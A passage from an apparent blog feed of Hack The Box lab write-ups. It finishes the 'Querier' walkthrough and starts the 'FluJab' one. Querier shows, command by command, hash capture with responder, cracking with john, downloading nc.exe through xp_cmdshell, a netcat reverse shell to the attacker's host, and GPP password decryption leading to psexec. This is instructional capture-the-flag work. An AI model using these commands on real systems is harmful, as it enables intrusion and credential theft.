&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;mssql&quot;&gt;MSSQL&lt;/h3&gt;
&lt;h4 id=&quot;i-used-mssqlclientpy-from-impacket-to-connect-to-the-server-first-attempt-failed-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;mssqlclient.py&lt;/code&gt; from &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt;&lt;/a&gt; to connect to the server. First attempt failed :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# /opt/impacket/examples/mssqlclient.py reporting@querier.htb -db volume 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(QUERIER): Line 1: Login failed for user 'reporting'.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-added-the-windows-authentication-option--windows-auth-and-it-worked-&quot;&gt;I added the windows authentication option (&lt;code class=&quot;highlighter-rouge&quot;&gt;-windows-auth&lt;/code&gt;) and it worked :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;unfortunately--permission-denied-for-xp_cmdshell-&quot;&gt;Unfortunately … permission denied for &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; enable_xp_cmdshell
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-ran-responder-responder--i-tun0-and-used-xp_dirtree-to-see-what-hashes-can-i-catch-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;responder -I tun0&lt;/code&gt;) and used &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_dirtree&lt;/code&gt; to see what hashes can I catch :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/5.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:53af3039d4607fd0:2423D19E432FFDDC2E4BF3B1E45272A5:0101000000000000C0653150DE09D201C11337A1C52B6EA7000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000051E8A512CD87D5811D02139C02C80CC4814E3213A0CCBD9EC4B588C8FCC85AD70A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310039002E0032003700000000000000000000000000
[*] Skipping previously captured hash for QUERIER\mssql-svc
[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
[SMBv2] NTLMv2-SSP Username : \gX
[SMBv2] NTLMv2-SSP Hash     : gX:::1d968811d030fdad::
[*] Skipping previously captured hash for \gX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;and-we-got-the-ntlmv2-hash-for-mssql-svc&quot;&gt;And we got the &lt;code class=&quot;highlighter-rouge&quot;&gt;NTLMv2&lt;/code&gt; hash for &lt;code class=&quot;highlighter-rouge&quot;&gt;mssql-svc&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-used-john-and-rockyou-to-crack-the-hash-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rockyou&lt;/code&gt; to crack the hash :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# john --wordlist=/usr/share/wordlists/rockyou.txt mssql-svc.hash 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)
1g 0:00:00:07 DONE (2019-06-21 07:41) 0.1321g/s 1184Kp/s 1184Kc/s 1184KC/s correforenz..corby909
Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;now-its-time-to-enable-xp_cmdshell-and-get-a-reverse-shell&quot;&gt;Now it’s time to enable &lt;code class=&quot;highlighter-rouge&quot;&gt;xp_cmdshell&lt;/code&gt; and get a reverse shell.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/querier/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-rce-i-ran-a-python-server-to-host-ncexe-then-i-used-invoke-webrequest-to-download-it-&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt;. I ran a python server to host &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-WebRequest&lt;/code&gt; to download it :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SQL&amp;gt; EXEC xp_cmdshell 'powershell.exe Invoke-WebRequest -o C:\Users\mssql-svc\appdata\local\temp\nc.exe http://10.10.xx.xx/nc.exe'
output                                                                                                                                                                                                                                                            
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
NULL
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-got-a-reverse-shell-&quot;&gt;Then I got a reverse shell :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;EXEC xp_cmdshell 'C:\Users\mssql-svc\appdata\local\temp\nc.exe -e cmd.exe 10.10.xx.xx 1337'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;gpp-privilege-escalation-root-flag&quot;&gt;GPP, Privilege Escalation, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;one-of-the-things-to-check-when-enumerating-windows-machines-is-group-policy-passwords-which-happened-to-be-the-privilege-escalation-vector-here-i-checked-group-policy-passwords-and-found-administrators-password-&quot;&gt;One of the things to check when enumerating Windows machines is group policy passwords which happened to be the privilege escalation vector here. I checked group policy passwords and found Administrator’s password :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/querier/10.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/querier/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;groupsxml-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Groups.xml&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;Groups&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;User&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changed=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2019-01-28 23:12:48&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{CD450F70-CDB8-4948-B908-F8D038C59B6C}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userContext=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;removePolicy=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;policyApplied=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Properties&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;U&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;newName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fullName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;description=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cpassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changeLogon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;noChange=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;neverExpires=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;acctDisabled=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Administrator&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/Properties&amp;gt;&amp;lt;/User&amp;gt;&amp;lt;/Groups&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-still-need-to-decrypt-the-password-which-can-be-easily-done-using-gpp-decrypt-&quot;&gt;We still need to decrypt the password which can be easily done using &lt;code class=&quot;highlighter-rouge&quot;&gt;gpp-decrypt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/querier# gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
MyUnclesAreMarioAndLuigi!!1!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;password-is-myunclesaremarioandluigi1-we-can-use-it-with-psexecpy-from-impacket-and-get-a-shell-as-system-&quot;&gt;Password is &lt;code class=&quot;highlighter-rouge&quot;&gt;MyUnclesAreMarioAndLuigi!!1!&lt;/code&gt;. We can use it with &lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py&lt;/code&gt; from &lt;code class=&quot;highlighter-rouge&quot;&gt;impacket&lt;/code&gt; and get a shell as system :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;psexec.py Administrator:'MyUnclesAreMarioAndLuigi!!1!'@querier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/querier/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;second-write-up--hack-the-box---querier-commando&quot;&gt;Second write-up : &lt;a href=&quot;/hack-the-box/querier-2&quot;&gt;Hack The Box - Querier (Commando)&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---flujab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/flujab/&quot;&gt;Hack The Box - Flujab&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---netmon&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/netmon/&quot;&gt;Hack The Box - Netmon&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="RCE" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Querier retired and here’s my write-up about it. It was a great windows machine covering some interesting stuff and I enjoyed it.I wrote two posts for this machine, first one solving it with kali and the other one solving it with commando vm, you can find the second post here. It’s a Windows box and its ip is 10.10.10.125, I added it to /etc/hosts as querier.htb. Let’s jump right in! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC querier.htb We got smb and mssql server on port 1433. Let’s check smb. Smb We need to list the shares first. I used smbclient : ``` smbclient –list //querier.htb/ -U “” Enter WORKGROUP's password:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/querier/0.png" /></entry><entry><title type="html">Hack The Box - FluJab</title><link href="http://localhost:4000/hack-the-box/flujab/" rel="alternate" type="text/html" title="Hack The Box - FluJab" /><published>2019-06-15T00:00:00+02:00</published><updated>2019-06-15T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/flujab</id><content type="html" xml:base="http://localhost:4000/hack-the-box/flujab/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-flujab-retired-and-heres-my-write-up-about-it-this-machine-had-a-lot-of-rabbit-holes-and-trolls-which-made-it-hard-to-enjoy-the-machine-but-without-mentioning-those-annoying-things-this-machine-had-some-really-cool-web-exploitation-parts-like-cookie-manipulation-authentication-bypasses-and-most-importantly-an-interesting-sql-injection-vulnerability-ajenti-administration-panel-was-installed-on-the-box-and-i-could-get-credentials-for-it-by-exploiting-the-sqli--after-that-i-could-use-a-users-public-ssh-key-to-get-the-private-key-as-it-was-vulnerable-to-cve-2008-0166-then-i-escaped-rbash-and-exploited-a-vulnerable-version-of-screen-to-get-a-root-shell-its-a-linux-box-and-its-ip-is-101010124-i-added-it-to-etchosts-as-flujabhtb-lets-jump-right-in-&quot;&gt;Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting &lt;code class=&quot;highlighter-rouge&quot;&gt;SQL&lt;/code&gt; injection vulnerability. &lt;code class=&quot;highlighter-rouge&quot;&gt;Ajenti&lt;/code&gt; administration panel was installed on the box and I could get credentials for it by exploiting the &lt;code class=&quot;highlighter-rouge&quot;&gt;SQLi&lt;/code&gt;,  After that I could use a user’s public ssh key to get the private key as it was vulnerable to &lt;code class=&quot;highlighter-rouge&quot;&gt;CVE-2008-0166&lt;/code&gt; then I escaped &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt; and exploited a vulnerable version of &lt;code class=&quot;highlighter-rouge&quot;&gt;screen&lt;/code&gt; to get a root shell. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.124&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC flujab.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/flujab/1.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-ssh-on-port-22-http-on-ports-80-and-8080-and-https-on-port-443-theres-also-some-sort-of-virtual-hosting-as-we-can-see-from-the-nmap-scan-and-there-are-a-lot-of-domains-&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22, &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on ports 80 and 8080 and &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 443. There’s also some sort of virtual hosting as we can see from the &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scan and there are a lot of domains …&lt;/h4&gt;
&lt;h4 id=&quot;we-can-also-check-the-ssl-certificate-manually-&quot;&gt;We can also check the &lt;code class=&quot;highlighter-rouge&quot;&gt;ssl&lt;/code&gt; certificate manually :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/3.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
&lt;h4 id=&quot;i-added-all-of-them-to-etchosts-and-checked-them-however-i-will-skip-the-rabbit-holes-in-the-write-up-because-its-just-a-waste-of-time-if-we-take-a-look-at-what-we-have-&quot;&gt;I added all of them to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-machine-name-is-flujab-so-we-are-only-interested-in-&quot;&gt;The machine name is &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab&lt;/code&gt; so we are only interested in :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;console.flujab.htb
sys.flujab.htb
smtp.flujab.htb
freeflujab.htb
flujab.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-saw-that-error-about-direct-ip-access-when-we-visited-flujabhtb-lets-check-the-other-4&quot;&gt;We saw that error about direct ip access when we visited &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;, Let’s check the other 4.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;console.flujab.htb&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;just-a-troll-&quot;&gt;Just a troll !&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sys.flujab.htb&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-same-error-on-flujabhtb&quot;&gt;The same error on &lt;code class=&quot;highlighter-rouge&quot;&gt;flujab.htb&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smtp.flujab.htb&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/flujab/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-dont-have-any-credentials-for-that&quot;&gt;We don’t have any credentials for that.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;freeflujab.htb&lt;/code&gt; : 
&lt;img src=&quot;/images/hackthebox/flujab/10.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/11.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/12.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/13.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;that-one-is-interesting-i-tried-to-run-gobuster-but-there-was-a-wildcard-response-when-i-checked-manually-i-found-that-instead-of-responding-with-404-it-responds-with-a-redirection-to-httpsclownwarehtbcwerror_pagesphp-which-has-a-gif-of-a-strange-creepy-clown-&quot;&gt;That one is interesting. I tried to run &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; but there was a wildcard response. When I checked manually I found that instead of responding with &lt;code class=&quot;highlighter-rouge&quot;&gt;404&lt;/code&gt; it responds with a redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;https://clownware.htb/cwerror_pages.php&lt;/code&gt; which has a &lt;code class=&quot;highlighter-rouge&quot;&gt;gif&lt;/code&gt; of a strange creepy clown …&lt;/h4&gt;
&lt;h4 id=&quot;note--i-checked-them-all-on-port-8080-too-but-i-always-got-the-direct-ip-access-error&quot;&gt;Note : I checked them all on port 8080 too but I always got the direct ip access error.&lt;/h4&gt;
&lt;h4 id=&quot;i-started-burp-and-configured-the-scope-&quot;&gt;I started &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; and configured the scope :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/15.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/16.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-ran-the-spider-&quot;&gt;Then I ran the spider :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;results-&quot;&gt;Results :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/19.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/20.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/flujab/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-the-requests-and-the-responses-of-different-pages-and-actions-i-noticed-in-one-of-the-responses-a-set-cookie-header-that-sets-a-cookie-called-modus-and-sets-the-path-for-it-to-smtp_config&quot;&gt;I checked the requests and the responses of different pages and actions. I noticed in one of the responses a &lt;code class=&quot;highlighter-rouge&quot;&gt;Set-Cookie&lt;/code&gt; header that sets a cookie called &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; and sets the path for it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?smtp_config&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-requested-smtp_config-in-the-browser-and-looked-at-the-request-in-burp-&quot;&gt;I requested &lt;code class=&quot;highlighter-rouge&quot;&gt;/?smtp_config&lt;/code&gt; in the browser and looked at the request in &lt;code class=&quot;highlighter-rouge&quot;&gt;burp&lt;/code&gt; :&lt;/h4&gt;
&lt;h4 id=&quot;request-&quot;&gt;Request :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/flujab/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-response-was-a-redirection-to-denied-we-are-sending-3-cookies-in-every-request--modus--patient-and-registered-modus-and-registered-are-base-64-encoded-strings-while-patient-is-an-md5-hash&quot;&gt;The response was a redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;/?denied&lt;/code&gt;. We are sending 3 cookies in every request : &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;Modus&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Registered&lt;/code&gt; are &lt;code class=&quot;highlighter-rouge&quot;&gt;base-64&lt;/code&gt; encoded strings while &lt;code class=&quot;highlighter-rouge&quot;&gt;Patient&lt;/code&gt; is an &lt;code class=&quot;highlighter-rouge&quot;&gt;md5&lt;/code&gt; hash.&lt;/h4&gt;
